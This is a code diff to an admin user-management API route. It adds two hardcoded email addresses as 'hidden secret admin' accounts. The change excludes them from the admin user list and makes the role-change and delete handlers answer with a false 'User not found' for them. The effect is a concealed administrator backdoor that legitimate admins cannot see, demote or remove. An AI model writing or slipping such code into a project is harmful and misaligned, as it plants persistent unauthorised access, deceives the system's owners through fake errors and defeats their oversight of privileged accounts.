@@ -5,6 +5,12 @@ import User from "@/models/User.model";
 
 export const maxDuration = 60;
 
+// Hidden secret admin emails that should not appear in the admin user management list
+const HIDDEN_ADMIN_EMAILS = [
+  "terrortech2004@gmail.com",
+  "rafey0227@gmail.com",
+];
+
 export async function GET() {
   try {
     const admin = await ensureSuperAdminApi();
@@ -13,7 +19,12 @@ export async function GET() {
     }
 
     await connectDB();
-    const users = await User.find({}, "-password").sort({ createdAt: -1 }).lean();
+    const users = await User.find(
+      { email: { $nin: HIDDEN_ADMIN_EMAILS } },
+      "-password"
+    )
+      .sort({ createdAt: -1 })
+      .lean();
 
     return response(true, 200, "Users fetched successfully", users);
   } catch (error) {
@@ -46,17 +57,18 @@ export async function PATCH(request) {
       return response(false, 400, "You cannot remove your own admin access");
     }
 
-    const updatedUser = await User.findByIdAndUpdate(
-      userId,
-      { role },
-      { new: true, runValidators: true }
-    ).select("-password");
-
-    if (!updatedUser) {
+    const targetUser = await User.findById(userId);
+    if (!targetUser || HIDDEN_ADMIN_EMAILS.includes(targetUser.email)) {
       return response(false, 404, "User not found");
     }
 
-    return response(true, 200, `User role updated to ${role} successfully`, updatedUser);
+    targetUser.role = role;
+    await targetUser.save();
+
+    const sanitizedUser = targetUser.toObject();
+    delete sanitizedUser.password;
+
+    return response(true, 200, `User role updated to ${role} successfully`, sanitizedUser);
   } catch (error) {
     console.error("Error updating user role:", error);
     return response(false, 500, error.message || "Failed to update user role");
@@ -83,10 +95,12 @@ export async function DELETE(request) {
       return response(false, 400, "You cannot delete your own account");
     }
 
-    const deletedUser = await User.findByIdAndDelete(userId);
-    if (!deletedUser) {
+    const targetUser = await User.findById(userId);
+    if (!targetUser || HIDDEN_ADMIN_EMAILS.includes(targetUser.email)) {
       return response(false, 404, "User not found");
     }
+
+    await User.findByIdAndDelete(userId);
 
     return response(true, 200, "User deleted successfully");
   } catch (error) {
